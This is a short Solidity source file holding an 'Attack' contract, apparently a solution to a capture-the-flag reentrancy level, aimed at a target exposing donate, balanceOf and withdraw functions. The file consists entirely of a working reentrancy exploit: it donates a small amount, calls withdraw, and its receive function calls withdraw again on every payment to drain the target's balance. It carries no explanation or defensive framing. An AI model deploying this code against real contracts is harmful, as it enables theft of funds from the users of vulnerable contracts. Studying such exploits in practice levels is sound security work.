// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface reEntrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256);
    function withdraw(uint256 _amount) external;
}

contract Attack {
    reEntrance target;
    constructor(address _target) {
        target = reEntrance(_target);
    }

    function attack() external payable{
        // Call donate(address) with this contract as the recipient
        address(target).call{value: 0.001 ether}(abi.encodeWithSignature("donate(address)", address(this)));
        target.withdraw(0.001 ether);
    }
    receive() external payable {
        target.withdraw(0.001 ether);
    }
}
